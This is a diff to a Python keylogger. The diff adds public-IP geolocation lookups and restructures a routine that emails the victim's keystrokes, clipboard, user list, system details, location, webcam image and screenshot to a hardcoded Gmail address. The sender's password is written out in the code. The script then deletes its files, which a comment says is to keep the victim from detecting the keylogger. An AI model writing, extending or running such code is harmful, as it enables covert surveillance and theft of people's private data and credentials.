@@ -13,6 +13,7 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import os
+import requests
 
 
 # class to log the keys and create a log file with intercepted keystrokes in
@@ -95,7 +96,7 @@ def clipboard():
 def system_info():
     # gather platform data
     info = platform.uname()
-    # Get IP address
+    # Get private IP address
     ip_address = socket.gethostbyname(socket.gethostname())
     # Get MAC Address and format it correctly
     mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1])
@@ -116,6 +117,34 @@ def get_users():
     for file in filenames:
         result = result + file + " , "
     return "The Users on this system are: " + result
+
+
+def get_location_from_public_ip():
+    try:
+        # Fetch the public IP address of the current device.
+        response = requests.get('https://api64.ipify.org?format=json')
+        public_ip = response.json()['ip']
+
+        # Use "ip-api.com" API to get location information based on the public IP address.
+        url = f"http://ip-api.com/json/{public_ip}"
+        response = requests.get(url)
+        data = response.json()
+        # if a location is found, return the data, otherwise return nothing
+        if data['status'] == 'success':
+            location_data = {
+                "ip": public_ip,
+                "city": data.get('city', 'N/A'),
+                "region": data.get('regionName', 'N/A'),
+                "country": data.get('country', 'N/A'),
+                "latitude": data.get('lat', 'N/A'),
+                "longitude": data.get('lon', 'N/A')
+            }
+            return location_data
+        else:
+            return None
+    # print error if function fails
+    except Exception as e:
+        return f"Error: {e}"
 
 
 # Class to create and send email
@@ -175,47 +204,52 @@ if __name__ == "__main__":
     logger.main()
     time.sleep(5)
 
-# gather information for email
-system_data = system_info()
+    # gather information for email
+    system_data = system_info()
+    location_info = get_location_from_public_ip()
 
-sender_email = "redpanda121003@gmail.com"
-sender_password = "pneewfuoyynmqctj"
+    sender_email = "redpanda121003@gmail.com"
+    sender_password = "pneewfuoyynmqctj"
 
-email_sender = EmailSender(sender_email, sender_password)
+    email_sender = EmailSender(sender_email, sender_password)
 
-recipient_email = "redpanda121003@gmail.com"
-email_subject = "Keylogger Data"
-# display the data in a presentable way
-email_message = '''\
+    recipient_email = "redpanda121003@gmail.com"
+    email_subject = "Keylogger Data"
+    # display the data in a presentable way
+    email_message = '''\
+    
+    The following data was retrieved:
+    
+    Hostname: {system_data[0]}
+    Processor Model: {system_data[1]}
+    Operating System: {system_data[2]}
+    Private IP Address: {system_data[3]}
+    MAC Address: {system_data[4]}
+    
+    Public IP Address: {location_info[ip]}
+    Location: {location_info[city]}, {location_info[region]}, {location_info[country]}
+    Latitude: {location_info[latitude]}, Longitude: {location_info[longitude]}
+    
+    {get_users}
+    
+    {clipboard}
+    
+    \
+    '''.format(system_data=system_data, clipboard=clipboard(), get_users=get_users(), location_info=location_info)
 
-The following data was retrieved:
+    # assign variables to attachments for the email
+    keystrokes_file = "keystrokes.txt"
+    webcam_file = "webcam.png"
+    screenshot_file = "screenshot.png"
 
-Hostname: {system_data[0]}
-Processor Model: {system_data[1]}
-Operating System: {system_data[2]}
-IP Address: {system_data[3]}
-MAC Address: {system_data[4]}
+    # send the email
+    email_sender.send_email(recipient_email, email_subject, email_message, keystrokes_file, webcam_file, screenshot_file)
 
-{get_users}
+    # close keystrokes file
+    f.close()
 
-{clipboard}
-
-\
-'''.format(system_data=system_data, clipboard=clipboard(), get_users=get_users())
-
-# assign variables to attachments for the email
-keystrokes_file = "keystrokes.txt"
-webcam_file = "webcam.png"
-screenshot_file = "screenshot.png"
-
-# send the email
-email_sender.send_email(recipient_email, email_subject, email_message, keystrokes_file, webcam_file, screenshot_file)
-
-# close keystrokes file
-f.close()
-
-# delete files to avoid victim detecting the keylogger
-os.remove("keystrokes.txt")
-os.remove("screenshot.png")
-os.remove("webcam.png")
+    # delete files to avoid victim detecting the keylogger
+    os.remove("keystrokes.txt")
+    os.remove("screenshot.png")
+    os.remove("webcam.png")
 
